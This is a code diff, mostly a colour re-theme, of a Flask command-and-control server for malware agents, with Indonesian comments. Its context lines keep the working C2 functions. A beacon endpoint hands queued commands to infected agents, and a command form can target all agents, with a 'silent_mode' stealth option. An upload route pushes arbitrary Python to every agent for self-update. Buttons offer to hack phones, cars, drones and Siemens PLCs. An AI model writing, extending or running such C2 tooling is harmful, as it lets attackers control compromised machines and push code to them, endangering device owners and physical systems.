+        <pre style="font-size: 0.95em; background: rgba(30,30,30,0.8); padding: 15px; border: 1px solid var(--text);">
 {chr(10).join([f"[{last_seen.strftime('%H:%M:%S')}] {agent_id} - <span class='status-{AGENT_STATUS.get(agent_id, 'offline')}'>{AGENT_STATUS.get(agent_id, 'unknown').upper()}</span>" for agent_id, last_seen in list(AGENT_LAST_SEEN.items())[-5:]]) or "Belum ada agent check-in."}
         </pre>
     </div>
@@ -778,12 +790,11 @@ def home():
              {{
                 labels: {json.dumps(chart_labels)},
                 datasets: [{{
-                    label: 'Agent Online',
                      {json.dumps(chart_data)},
-                    borderColor: '#b8860b',
-                    backgroundColor: 'rgba(184, 134, 11, 0.1)',
+                    borderColor: '#FFA500',
+                    backgroundColor: 'rgba(255, 165, 0, 0.1)',
                     tension: 0.4,
-                    pointBackgroundColor: '#8b0000',
+                    pointBackgroundColor: '#FF4500',
                     pointBorderColor: '#ffffff',
                     pointRadius: 5,
                     fill: true
@@ -792,11 +803,11 @@ def home():
             options: {{
                 responsive: true,
                 plugins: {{
-                    legend: {{ labels: {{ color: '#3b2f2f' }} }} }}
+                    legend: {{ labels: {{ color: '#FFA500' }} }} }}
                 }},
                 scales: {{
-                    x: {{ ticks: {{ color: '#3b2f2f' }} }},
-                    y: {{ beginAtZero: true, ticks: {{ color: '#3b2f2f' }} }}
+                    x: {{ ticks: {{ color: '#FFA500' }} }},
+                    y: {{ beginAtZero: true, ticks: {{ color: '#FFA500' }} }}
                 }},
                 animation: {{ duration: 2000 }}
             }}
@@ -804,6 +815,8 @@ def home():
     </script>
     '''
     return render_template_string(get_dashboard_template(), content=content, agents_online=online_count, neural_active=True, risk_score=ai_insight.get("risk_score", 0))
+
+# === ROUTES LAINNYA === (SAMA SEPERTI SEBELUMNYA — TANPA PERUBAHAN)
 
 @app.route('/swarm')
 def swarm_map():
@@ -848,35 +861,35 @@ def swarm_map():
         const camera = new THREE.PerspectiveCamera(75, container.clientWidth / container.clientHeight, 0.1, 1000);
         const renderer = new THREE.WebGLRenderer({{ antialias: true }});
         renderer.setSize(container.clientWidth, container.clientHeight);
-        renderer.setClearColor(0x2c2620);
+        renderer.setClearColor(0x111111);
         renderer.shadowMap.enabled = true;
         container.appendChild(renderer.domElement);
 
-        const ambientLight = new THREE.AmbientLight(0x5c4a3d);
+        const ambientLight = new THREE.AmbientLight(0x333333);
         scene.add(ambientLight);
-        
-        const directionalLight = new THREE.DirectionalLight(0xb8860b, 1);
+
+        const directionalLight = new THREE.DirectionalLight(0xFFA500, 1);
         directionalLight.position.set(5, 10, 7);
         directionalLight.castShadow = true;
         scene.add(directionalLight);
 
-        const pointLight = new THREE.PointLight(0x8b0000, 1.5, 100);
+        const pointLight = new THREE.PointLight(0xFFD700, 1.5, 100);
         pointLight.position.set(0, 0, 0);
         scene.add(pointLight);
 
         const particleCount = 1000;
         const particles = new THREE.BufferGeometry();
         const particlePositions = new Float32Array(particleCount * 3);
-        
+
         for (let i = 0; i < particleCount; i++) {{
             particlePositions[i * 3] = (Math.random() - 0.5) * 1000;
             particlePositions[i * 3 + 1] = (Math.random() - 0.5) * 1000;
             particlePositions[i * 3 + 2] = (Math.random() - 0.5) * 1000;
         }}
-        
+
         particles.setAttribute('position', new THREE.BufferAttribute(particlePositions, 3));
-        const particleMaterial = new THREE.PointsMaterial({{ 
-            color: 0xb8860b,
+        const particleMaterial = new THREE.PointsMaterial({{
+            color: 0xFFA500,
             size: 1,
             transparent: true,
             opacity: 0.6
@@ -890,17 +903,17 @@ def swarm_map():
         const lines = [];
 
         const genColors = [
-            0xb8860b, // Gen 0 - Emas
-            0x8b4513, // Gen 1 - Coklat Saddle
-            0x8b0000, // Gen 2 - Merah Marun
-            0x556b2f, // Gen 3 - Hijau Gelap
-            0x4b0082  // Gen 4+ - Indigo
+            0xFFA500, // Gen 0 - Orange
+            0xFFD700, // Gen 1 - Gold
+            0xFF4500, // Gen 2 - OrangeRed
+            0xFF6347, // Gen 3 - Tomato
+            0xFF1493  // Gen 4+ - DeepPink
         ];
 
         nodes.forEach((node, i) => {{
             const geometry = new THREE.SphereGeometry(5 + node.gen, 32, 32);
             const color = genColors[Math.min(node.gen, 4)];
-            const material = new THREE.MeshPhongMaterial({{ 
+            const material = new THREE.MeshPhongMaterial({{
                 color: color,
                 emissive: color,
                 emissiveIntensity: 0.5,
@@ -919,12 +932,12 @@ def swarm_map():
             const context = canvas.getContext('2d');
             canvas.width = 256;
             canvas.height = 64;
-            context.fillStyle = 'rgba(245, 240, 230, 0.7)';
+            context.fillStyle = 'rgba(20, 20, 20, 0.8)';
             context.fillRect(0, 0, 256, 64);
             context.font = '32px Courier New';
-            context.fillStyle = node.status === 'online' ? '#b8860b' : '#8b0000';
+            context.fillStyle = node.status === 'online' ? '#FFA500' : '#FF4500';
             context.fillText(node.name, 10, 40);
-            context.strokeStyle = '#3b2f2f';
+            context.strokeStyle = '#FFFFFF';
             context.strokeRect(0, 0, 256, 64);
 
             const texture = new THREE.CanvasTexture(canvas);
@@ -941,8 +954,8 @@ def swarm_map():
             const curve = new THREE.LineCurve3(start.clone(), end.clone());
             const tubeGeometry = new THREE.TubeGeometry(curve, 20, 0.5, 8, false);
             const tubeMaterial = new THREE.MeshPhongMaterial({{
-                color: 0x5c4a3d,
-                emissive: 0x5c4a3d,
+                color: 0xAAAAAA,
+                emissive: 0xAAAAAA,
                 emissiveIntensity: 0.5,
                 transparent: true,
                 opacity: 0.8
@@ -993,11 +1006,11 @@ def swarm_map():
         info.style.position = 'absolute';
         info.style.top = '10px';
         info.style.left = '10px';
-        info.style.color = '#b8860b';
+        info.style.color = '#FFA500';
         info.style.fontFamily = 'monospace';
         info.style.padding = '10px';
-        info.style.backgroundColor = 'rgba(44, 38, 32, 0.7)';
-        info.style.border = '1px solid #b8860b';
+        info.style.backgroundColor = 'rgba(20,20,20,0.7)';
+        info.style.border = '1px solid #FFA500';
         info.innerHTML = '<h4>🖱️ Controls:</h4><p>- Drag: Rotate<br>- Scroll: Zoom<br>- Double Click: Toggle Auto-Rotate</p>';
         container.appendChild(info);
     </script>
@@ -1018,10 +1031,10 @@ def agents_live():
         sev_tag = f'<span class="tag tag-swarm">G{gen}</span> <span class="tag tag-web">{via}</span>'
 
         agents_html += f'''
-        <div style="border: 1px solid var(--border-paper); margin: 15px 0; padding: 15px; background: rgba(255,255,255,0.8);">
+        <div style="border: 1px solid var(--text); margin: 15px 0; padding: 15px; background: rgba(30,30,30,0.8);">
             <div style="display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap;">
                 <div>
-                    <b style="font-size: 1.1em;">{agent_id}</b> 
+                    <b style="font-size: 1.1em;">{agent_id}</b>
                     <span class="status-{status}">● {status.upper()}</span>
                     {sev_tag}
                 </div>
@@ -1046,18 +1059,11 @@ def agents_live():
 
     <div class="card">
         <h3>📋 Daftar Agent ({len(AGENT_LAST_SEEN)} Agent)</h3>
-        {agents_html if agents_html else "<p style='color: var(--alert-maroon);'>Belum ada agent terdaftar.</p>"}
+        {agents_html if agents_html else "<p style='color: var(--alert);'>Belum ada agent terdaftar.</p>"}
     </div>
 
     <script>
-        setInterval(() => {{
-            fetch('/agents').then(r => r.text()).then(html => {{
-                const parser = new DOMParser();
-                const doc = parser.parseFromString(html, 'text/html');
-                const newContent = doc.querySelector('.container').innerHTML;
-                document.querySelector('.container').innerHTML = newContent;
-            }});
-        }}, 5000);
+        // Tidak perlu auto-refresh — sudah di-handle global
     </script>
     '''
     return render_template_string(get_dashboard_template(), content=content, agents_online=sum(1 for s in AGENT_STATUS.values() if s == "online"), neural_active=True, risk_score=0)
@@ -1087,7 +1093,6 @@ def command_center():
         }
 
         if agent_id.lower() == "all":
-            # Kirim ke semua agent
             count = 0
             for aid in AGENT_LAST_SEEN.keys():
                 ACTIVE_COMMANDS[aid] = command_data.copy()
@@ -1138,7 +1143,6 @@ def command_center():
                     <option value="web_swarm_only">🌐 web_swarm_only - Web zombie hunter only</option>
                     <option value="silent_mode">👻 silent_mode - Stealth operation</option>
                     <option value="set_generation">🧬 set_generation - Set swarm generation</option>
-                    <!-- ✅ BARU: Hardware Commands -->
                     <option value="mobile_control">📱 mobile_control - Hack smartphone</option>
                     <option value="car_hack">🚗 car_hack - Hack car</option>
                     <option value="arduino_control">🤖 arduino_control - Hack Arduino/ESP32</option>
@@ -1149,13 +1153,13 @@ def command_center():
             </div>
             <div style="margin-bottom: 20px;">
                 <label style="display: block; margin-bottom: 8px;">Data (JSON - opsional):</label>
-                <textarea name="data" rows="4" placeholder='{{"target_ip": "192.168.1.100", "device_type": "Android"}}' style="width: 100%; padding: 10px; border: 1px solid var(--border-paper); background: rgba(255,255,255,0.9);">{{}}</textarea>
+                <textarea name="data" rows="4" placeholder='{{"target_ip": "192.168.1.100", "device_type": "Android"}}' style="width: 100%; padding: 10px; border: 1px solid var(--text); background: rgba(30,30,30,0.8); color: var(--text);">{{}}</textarea>
             </div>
             <div style="margin-bottom: 20px;">
                 <label style="display: block; margin-bottom: 8px;">Catatan (Opsional):</label>
-                <input type="text" name="note" placeholder="Contoh: target CEO's iPhone" style="width: 100%; padding: 10px; border: 1px solid var(--border-paper); background: rgba(255,255,255,0.9);">
+                <input type="text" name="note" placeholder="Contoh: target CEO's iPhone" style="width: 100%; padding: 10px; border: 1px solid var(--text); background: rgba(30,30,30,0.8); color: var(--text);">
             </div>
-            <button type="submit" style="background: var(--alert-maroon); color: white; border: 2px solid var(--alert-maroon);">🚀 KIRIM PERINTAH — OMNIVERSE CONFIRMED</button>
+            <button type="submit" style="background: var(--alert); color: white; border: 2px solid var(--alert);">🚀 KIRIM PERINTAH — OMNIVERSE CONFIRMED</button>
         </form>
     </div>
     '''
@@ -1184,13 +1188,12 @@ def list_reports():
                 gen = r.get("data", {}).get("generation", 0)
                 method = r.get("data", {}).get("method", "")
                 gen_tag = f'<span class="tag tag-swarm">G{gen}</span> <span class="tag tag-web">{method}</span>'
-            # ✅ BARU: Hardware tag
             elif r.get("type") in ["mobile_control", "car_hacked", "arduino_controlled", "drone_hijacked", "plc_hacked"]:
                 hw_type = r.get("type", "").replace("_", " ").title()
                 gen_tag = f'<span class="tag tag-hardware">{hw_type}</span>'
 
             formatted_reports.append(f'''
-<div style="margin: 15px 0; padding: 15px; border-left: 4px solid {'#8b0000' if is_high_severity(r) else '#b8860b'}; background: rgba(255,255,255,0.8);">
+<div style="margin: 15px 0; padding: 15px; border-left: 4px solid {'#FF4500' if is_high_severity(r) else '#FFA500'}; background: rgba(30,30,30,0.8);">
     <div style="display: flex; justify-content: space-between; flex-wrap: wrap;">
         <div><b>Agent:</b> {r.get("id", "unknown")}</div>
         <div><span class="tag {sev_class}">{severity}</span> {gen_tag}</div>
@@ -1252,17 +1255,17 @@ def live_logs():
             issue = r.get("issue", "N/A")
             rtype = r.get("type", "beacon")
             severity = "🔴 HIGH" if is_high_severity(r) else "🟢 LOW"
-            sev_color = "#8b0000" if is_high_severity(r) else "#b8860b"
+            sev_color = "#FF4500" if is_high_severity(r) else "#FFA500"
             logs.append(f'<span style="color:{sev_color};">[{ts}]</span> <b>[{agent}]</b> {severity} | Type: {rtype} | {issue}')
 
         content = f'''
         <h2>📜 LIVE LOGS — OMNIVERSE FEED</h2>
         <div class="terminal" id="logTerminal">
-            <div id="logContent" style="color:#b8860b; font-family: 'Courier New';">
+            <div id="logContent" style="color:#FFA500; font-family: 'Courier New';">
                 {"".join(f"<div>{log}</div>" for log in logs) if logs else "<i>Belum ada log.</i>"}
             </div>
         </div>
-        <p><small>Real-time update via WebSocket — no refresh needed.</small></p>
+        <p><small>Auto-refresh every 5s — no WebSocket needed.</small></p>
         '''
         return render_template_string(get_dashboard_template(), content=content, agents_online=sum(1 for s in AGENT_STATUS.values() if s == "online"), neural_active=True, risk_score=0)
     except Exception as e:
@@ -1323,15 +1326,10 @@ def beacon():
             alert += f"🔧 Issue: {data.get('issue', 'unknown')}\n"
             alert += f"🕒 Waktu: {data['timestamp']}"
             send_alert(alert)
-            socketio.emit('new_alert', {"message": f"Critical issue found by {agent_id}: {data.get('issue', 'unknown')}"})
 
         cmd = ACTIVE_COMMANDS.get(agent_id, {"cmd": "idle"})
         if agent_id in ACTIVE_COMMANDS:
             del ACTIVE_COMMANDS[agent_id]
-
-        online_count = sum(1 for agent_id, last_seen in AGENT_LAST_SEEN.items() 
-                          if (datetime.now() - last_seen).total_seconds() < 300)
-        socketio.emit('update_dashboard', {"agents_online": online_count})
 
         return jsonify(cmd)
 
@@ -1339,7 +1337,6 @@ def beacon():
         print(f"[BEACON ERROR] {e}")
         return "Error", 500
 
-# ✅ BARU: ROUTE UNTUK UPLOAD UPGRADE SCRIPT
 @app.route('/upload_upgrade', methods=['GET', 'POST'])
 def upload_upgrade():
     if request.method == 'POST':
@@ -1348,7 +1345,6 @@ def upload_upgrade():
             if file.filename.endswith('.py'):
                 global AGENT_UPGRADE_SCRIPT
                 AGENT_UPGRADE_SCRIPT = file.read().decode('utf-8')
-                # Kirim ke semua agent aktif
                 count = 0
                 for agent_id in list(AGENT_LAST_SEEN.keys()):
                     if agent_id not in ACTIVE_COMMANDS:
@@ -1365,46 +1361,45 @@ def upload_upgrade():
                         count += 1
                 return jsonify({"success": True, "message": f"Upgrade script uploaded and broadcasted to {count} agents"})
         return jsonify({"error": "Invalid file - must be .py"}), 400
-    
+
     content = '''
     <h2>📤 UPLOAD UPGRADE SCRIPT — UPDATE SEMUA AGENT</h2>
     <div class="card">
         <form method="POST" enctype="multipart/form-data">
             <label>Upload agent.py baru:</label><br>
             <input type="file" name="file" accept=".py" required><br><br>
-            <button type="submit" style="background: var(--accent-gold); color: white; border: 2px solid var(--accent-gold);">🚀 DEPLOY KE SEMUA AGENT — MASS UPGRADE</button>
+            <button type="submit" style="background: var(--text-secondary); color: black; border: 2px solid var(--text-secondary);">🚀 DEPLOY KE SEMUA AGENT — MASS UPGRADE</button>
         </form>
         <p><small>File akan dikirim ke semua agent aktif. Agent akan self-update otomatis.</small></p>
     </div>
     '''
     return render_template_string(get_dashboard_template(), content=content, agents_online=sum(1 for s in AGENT_STATUS.values() if s == "online"), neural_active=True, risk_score=0)
 
-# ✅ BARU: ROUTE UNTUK HARDWARE CONTROL
 @app.route('/hardware')
 def hardware_control():
     content = '''
     <h2>🚗 HARDWARE APOCALYPSE CONTROL CENTER</h2>
     <div class="card">
         <h3>📱 Mobile Devices</h3>
-        <button onclick="sendCommand('mobile_control', '192.168.1.100', 'Android')" style="margin: 5px;">Hack Android</button>
-        <button onclick="sendCommand('mobile_control', '192.168.1.101', 'iOS')" style="margin: 5px;">Hack iPhone</button>
+        <button onclick="sendCommand('mobile_control', '192.168.1.100', 'Android')" style="margin: 5px; background: var(--text); color: black;">Hack Android</button>
+        <button onclick="sendCommand('mobile_control', '192.168.1.101', 'iOS')" style="margin: 5px; background: var(--text); color: black;">Hack iPhone</button>
     </div>
-    
+
     <div class="card">
         <h3>🚗 Cars</h3>
-        <button onclick="sendCommand('car_hack', '192.168.0.10', 'Toyota')" style="margin: 5px;">Hack Toyota</button>
-        <button onclick="sendCommand('car_hack', '192.168.0.11', 'Tesla')" style="margin: 5px;">Hack Tesla</button>
+        <button onclick="sendCommand('car_hack', '192.168.0.10', 'Toyota')" style="margin: 5px; background: var(--text); color: black;">Hack Toyota</button>
+        <button onclick="sendCommand('car_hack', '192.168.0.11', 'Tesla')" style="margin: 5px; background: var(--text); color: black;">Hack Tesla</button>
     </div>
-    
+
     <div class="card">
         <h3>🛸 Drones</h3>
-        <button onclick="sendCommand('drone_hijack', '192.168.1.101', 'DJI Mavic')" style="margin: 5px;">Hijack DJI</button>
+        <button onclick="sendCommand('drone_hijack', '192.168.1.101', 'DJI Mavic')" style="margin: 5px; background: var(--text); color: black;">Hijack DJI</button>
     </div>
-    
+
     <div class="card">
         <h3>🤖 Arduino/PLC</h3>
-        <button onclick="sendCommand('arduino_control', '192.168.1.50', 'ESP32')" style="margin: 5px;">Hack ESP32</button>
-        <button onclick="sendCommand('plc_hack', '192.168.2.50', 'Siemens S7')" style="margin: 5px;">Hack Factory</button>
+        <button onclick="sendCommand('arduino_control', '192.168.1.50', 'ESP32')" style="margin: 5px; background: var(--text); color: black;">Hack ESP32</button>
+        <button onclick="sendCommand('plc_hack', '192.168.2.50', 'Siemens S7')" style="margin: 5px; background: var(--text); color: black;">Hack Factory</button>
     </div>
 
     <script>
@@ -1435,7 +1430,6 @@ def update():
             'Content-Disposition': 'attachment; filename=agent.py'
         }
     else:
-        # Fallback ke versi default
         default_script = '''
 print("✅ Agent updated to latest version")
 import time
@@ -1483,8 +1477,8 @@ def analytics():
 
     <div class="ai-insight">
         <h3>🧠 NEURAL AI EXECUTIVE SUMMARY</h3>
-        <pre style="color:var(--accent-gold); white-space: pre-wrap; font-weight: bold; font-size: 1.1em;">{ai_insight["summary"]}</pre>
-        <p style="color: var(--alert-maroon); font-weight: bold; font-size: 1.2em;">🔮 PREDIKSI: {ai_insight["prediction"]}</p>
+        <pre style="color:var(--text-secondary); white-space: pre-wrap; font-weight: bold; font-size: 1.1em;">{ai_insight["summary"]}</pre>
+        <p style="color: var(--alert); font-weight: bold; font-size: 1.2em;">🔮 PREDIKSI: {ai_insight["prediction"]}</p>
     </div>
 
     <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(320px, 1fr)); gap: 25px;">
@@ -1527,20 +1521,20 @@ def analytics():
                 plugins: {{
                     legend: {{ display: false }},
                     tooltip: {{
-                        backgroundColor: 'rgba(245, 240, 230, 0.9)',
-                        titleColor: '#3b2f2f',
-                        bodyColor: '#000000'
+                        backgroundColor: 'rgba(30, 30, 30, 0.9)',
+                        titleColor: '#FFA500',
+                        bodyColor: '#FFFFFF'
                     }}
                 }},
                 scales: {{
-                    x: {{ 
-                        ticks: {{ color: '#3b2f2f' }},
-                        grid: {{ color: 'rgba(92, 74, 61, 0.1)' }}
+                    x: {{
+                        ticks: {{ color: '#FFA500' }},
+                        grid: {{ color: 'rgba(255, 165, 0, 0.1)' }}
                     }},
-                    y: {{ 
-                        beginAtZero: true, 
-                        ticks: {{ color: '#3b2f2f' }},
-                        grid: {{ color: 'rgba(92, 74, 61, 0.1)' }}
+                    y: {{
+                        beginAtZero: true,
+                        ticks: {{ color: '#FFA500' }},
+                        grid: {{ color: 'rgba(255, 165, 0, 0.1)' }}
                     }}
                 }},
                 animation: {{
@@ -1558,34 +1552,34 @@ def analytics():
                 datasets: [{{
                      {json.dumps(target_data)},
                     backgroundColor: [
-                        'rgba(184, 134, 11, 0.8)',
-                        'rgba(139, 69, 19, 0.8)',
-                        'rgba(139, 0, 0, 0.8)',
-                        'rgba(85, 107, 47, 0.8)',
-                        'rgba(75, 0, 130, 0.8)',
-                        'rgba(47, 79, 79, 0.8)',
-                        'rgba(105, 105, 105, 0.8)',
-                        'rgba(128, 0, 0, 0.8)',
-                        'rgba(139, 0, 139, 0.8)',
-                        'rgba(255, 140, 0, 0.8)'
+                        'rgba(255, 165, 0, 0.8)',
+                        'rgba(255, 215, 0, 0.8)',
+                        'rgba(255, 69, 0, 0.8)',
+                        'rgba(255, 99, 71, 0.8)',
+                        'rgba(255, 20, 147, 0.8)',
+                        'rgba(255, 140, 0, 0.8)',
+                        'rgba(255, 105, 180, 0.8)',
+                        'rgba(255, 0, 0, 0.8)',
+                        'rgba(255, 255, 0, 0.8)',
+                        'rgba(0, 255, 255, 0.8)'
                     ],
-                    borderColor: '#3b2f2f',
+                    borderColor: '#000000',
                     borderWidth: 1
                 }}]
             }},
             options: {{
                 responsive: true,
                 plugins: {{
-                    legend: {{ 
-                        labels: {{ 
-                            color: '#3b2f2f',
+                    legend: {{
+                        labels: {{
+                            color: '#FFA500',
                             font: {{ size: 12 }}
                         }}
                     }},
                     tooltip: {{
-                        backgroundColor: 'rgba(245, 240, 230, 0.9)',
-                        titleColor: '#3b2f2f',
-                        bodyColor: '#000000'
+                        backgroundColor: 'rgba(30, 30, 30, 0.9)',
+                        titleColor: '#FFA500',
+                        bodyColor: '#FFFFFF'
                     }}
                 }},
                 animation: {{
@@ -1604,10 +1598,10 @@ def analytics():
                 datasets: [{{
                     label: 'Agent Online',
                      {json.dumps(chart_data)},
-                    borderColor: '#b8860b',
-                    backgroundColor: 'rgba(184, 134, 11, 0.1)',
+                    borderColor: '#FFA500',
+                    backgroundColor: 'rgba(255, 165, 0, 0.1)',
                     tension: 0.3,
-                    pointBackgroundColor: '#8b0000',
+                    pointBackgroundColor: '#FF4500',
                     pointBorderColor: '#ffffff',
                     pointRadius: 4,
                     fill: true
@@ -1616,27 +1610,27 @@ def analytics():
             options: {{
                 responsive: true,
                 plugins: {{
-                    legend: {{ 
-                        labels: {{ 
-                            color: '#3b2f2f',
+                    legend: {{
+                        labels: {{
+                            color: '#FFA500',
                             font: {{ size: 14 }}
                         }}
                     }},
                     tooltip: {{
-                        backgroundColor: 'rgba(245, 240, 230, 0.9)',
-                        titleColor: '#3b2f2f',
-                        bodyColor: '#000000'
+                        backgroundColor: 'rgba(30, 30, 30, 0.9)',
+                        titleColor: '#FFA500',
+                        bodyColor: '#FFFFFF'
                     }}
                 }},
                 scales: {{
-                    x: {{ 
-                        ticks: {{ color: '#3b2f2f' }},
-                        grid: {{ color: 'rgba(92, 74, 61, 0.1)' }}
+                    x: {{
+                        ticks: {{ color: '#FFA500' }},
+                        grid: {{ color: 'rgba(255, 165, 0, 0.1)' }}
                     }},
-                    y: {{ 
-                        beginAtZero: true, 
-                        ticks: {{ color: '#3b2f2f' }},
-                        grid: {{ color: 'rgba(92, 74, 61, 0.1)' }}
+                    y: {{
+                        beginAtZero: true,
+                        ticks: {{ color: '#FFA500' }},
+                        grid: {{ color: 'rgba(255, 165, 0, 0.1)' }}
                     }}
                 }},
                 animation: {{
@@ -1649,22 +1643,11 @@ def analytics():
     '''
     return render_template_string(get_dashboard_template(), content=content, agents_online=sum(1 for s in AGENT_STATUS.values() if s == "online"), neural_active=True, risk_score=ai_insight.get("risk_score", 0))
 
-# === SOCKET.IO EVENTS ===
-@socketio.on('connect')
-def handle_connect():
-    print('Client connected to WebSocket')
-    SOCKETS.append(request.sid)
-
-@socketio.on('disconnect')
-def handle_disconnect():
-    if request.sid in SOCKETS:
-        SOCKETS.remove(request.sid)
-
 # === RUN ===
 if __name__ == '__main__':
-    port = int(os.environ.get("PORT", 8000))
+    port = int(os.environ.get("PORT", 8080))
     print("="*70)
-    print("🚀🚀🚀 C2 SENTINEL v14.0 — OMNIVERSE COMMAND CENTER")
+    print("🚀🚀🚀 SENTINEL ZERO OMNIVERSE — FLIPPER ZERO STYLE EDITION")
     print(f"🌐 Running on http://0.0.0.0:{port}")
     print(f"🔐 XOR Key: '{XOR_KEY}'")
     print(f"📡 MQTT Broker: {MQTT_HOST}:{MQTT_PORT}")
@@ -1672,4 +1655,4 @@ if __name__ == '__main__':
     print("="*70)
 
     threading.Thread(target=init_mqtt, daemon=True).start()
-    socketio.run(app, host='0.0.0.0', port=port, debug=False, allow_unsafe_werkzeug=True)
+    app.run(host='0.0.0.0', port=port, debug=False)
